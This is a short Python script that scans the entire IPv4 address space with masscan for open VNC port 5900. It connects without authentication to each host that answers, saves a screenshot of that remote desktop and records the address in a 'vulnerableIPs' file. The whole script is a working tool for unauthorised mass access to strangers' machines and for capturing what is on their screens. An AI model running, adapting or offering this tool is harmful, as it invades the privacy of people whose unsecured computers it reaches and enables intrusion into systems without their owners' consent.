

import os
from subprocess import call
from vncdotool import api
import os.path
import threading
from filelock import FileLock



def parseLine(line,number):
    parsedLine = line.split(" ")
    if parsedLine[0] == "open" and not os.path.isfile('screenshot_IP_{ip}.png'.format(ip=parsedLine[3])):
    #print "open at {ip}".format(ip=parsedLine[3])
        try:
            client = api.connect('{ip}:0'.format(ip=parsedLine[3]))
            #print "connected"
            client.captureScreen('screenshot_IP_{ip}.png'.format(ip=parsedLine[3]))
            print "screenshot taken"
            with FileLock("vulnerableIPs.txt"):
                with open('vulnerableIPs.txt', 'a') as file:
                    file.write(parsedLine[3])
        except:
            pass
            #print 'Cant get image from {ip}'.format(ip=parsedLine[3])

def getIPs():
    masscanCommand = "masscan"
    #masscanParameter = '-p5900 0.0.0.0/0 --rate=100 --exclude 255.255.255.255 --output-format list --output-filename ips.txt'
    call([masscanCommand, '-p5900', '0.0.0.0/0', '--rate=100', '--exclude', '255.255.255.255', '--output-format', 'list','--output-filename','ips.txt'])



def main():
    if os.geteuid() != 0:
        exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
    startLine = 1
    wasShown = False

    ipgetter = threading.Thread(target=getIPs,args=())
    ipgetter.start()



    while True:
        lineCounter = 1
        if os.path.isfile('ips.txt'):
            with open("ips.txt") as f:
                for line in f:
                    if lineCounter >= startLine:
                        startLine += 1
                        thread = threading.Thread(target=parseLine,  kwargs={'line':line,'number':lineCounter})
                        thread.start()
                        wasShown = False
                        #parseLine(line,lineCounter)
                    else:
                        if not wasShown:
                            #print "No more to do\n"
                            wasShown = True
                    lineCounter += 1

    return 0






if __name__ == '__main__':
    main()
